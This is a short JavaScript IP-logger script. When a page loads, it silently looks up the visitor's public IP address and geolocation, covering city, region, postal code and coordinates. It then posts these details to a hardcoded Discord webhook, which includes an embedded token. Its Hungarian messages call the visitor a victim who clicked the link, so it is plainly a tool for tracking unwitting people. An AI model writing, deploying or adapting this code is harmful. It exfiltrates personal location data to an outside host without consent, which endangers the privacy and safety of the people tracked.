const sendIP = () => {

fetch('https://api.ipify.org?format=json')  

    .then(ipResponse => ipResponse.json())  

    .then(ipData => {  

        const ipadd = ipData.ip;  

        return fetch(`https://ipapi.co/${ipadd}/json/`)  

            .then(geoResponse => geoResponse.json())  

            .then(geoData => {  

                const dscURL = 'https://discord.com/api/webhooks/1397140201008267375/OigaJ4FR510_5ExJAanLzDF0VKx-vnmNSEtpxbphhuQLizgB781VzCCR0o2Bp5l5SvX3'; // replace with your webhook url  

                return fetch(dscURL, {  

                    method: 'POST',  

                    headers: {  

                        'Content-Type': 'application/json'  

                    },  

                    body: JSON.stringify({  

                        username: "Helyszíni Naplózó <3", // optionally changeable  

                        avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable  

                        content: `<@1095731086513930260>`,  

                        embeds: [  

                            {  

                                title: 'Egy áldozat rákattintott a linkre!',  

                                description: `**IP-cím >> **${ipadd}\n**Hálózat >> ** ${geoData.network}\n**Város >> ** ${geoData.city}\n**Régió >> ** ${geoData.region}\n**Ország >> ** ${geoData.country_name}\n**Irányítószám >> ** ${geoData.postal}\n**Szélesség >> ** ${geoData.latitude}\n**Hosszúság >> ** ${geoData.longitude}`,  

                                color: 0x800080 // optionally changeable  

                            }  

                        ]  

                    })  

                });  

            });  

    })  

    .then(dscResponse => {    

        if (dscResponse.ok) {  

            console.log('Sent! <3');  

        } else {  

            console.log('Failed :(');  

        }  

    })  

    .catch(error => {  

        console.error('Error:', error);  

        console.log('Error :(');  

    });

};

sendIP();

